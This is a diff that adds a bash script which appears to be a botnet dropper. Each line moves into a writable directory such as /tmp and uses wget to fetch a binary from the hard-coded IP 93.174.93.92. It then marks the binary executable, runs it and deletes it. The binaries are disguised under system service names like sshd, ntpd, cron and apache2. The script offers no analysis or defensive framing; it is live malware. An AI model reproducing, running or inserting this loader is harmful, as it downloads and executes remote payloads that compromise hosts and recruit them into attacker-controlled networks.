@@ -1,0 +1,14 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOntpd; chmod +x HOHOntpd; ./HOHOntpd; rm -rf HOHOntpd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOsshd; chmod +x HOHOsshd; ./HOHOsshd; rm -rf HOHOsshd
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOopenssh; chmod +x HOHOopenssh; ./HOHOopenssh; rm -rf HOHOopenssh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHObash; chmod +x HOHObash; ./HOHObash; rm -rf HOHObash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOtftp; chmod +x HOHOtftp; ./HOHOtftp; rm -rf HOHOtftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOwget; chmod +x HOHOwget; ./HOHOwget; rm -rf HOHOwget
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOcron; chmod +x HOHOcron; ./HOHOcron; rm -rf HOHOcron
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOftp; chmod +x HOHOftp; ./HOHOftp; rm -rf HOHOftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOpftp; chmod +x HOHOpftp; ./HOHOpftp; rm -rf HOHOpftp
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOsh; chmod +x HOHOsh; ./HOHOsh; rm -rf HOHOsh
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/' '; chmod +x ' '; ./' '; rm -rf ' '
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOapache2; chmod +x HOHOapache2; ./HOHOapache2; rm -rf HOHOapache2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://93.174.93.92/HOHOtelnetd; chmod +x HOHOtelnetd; ./HOHOtelnetd; rm -rf HOHOtelnetd
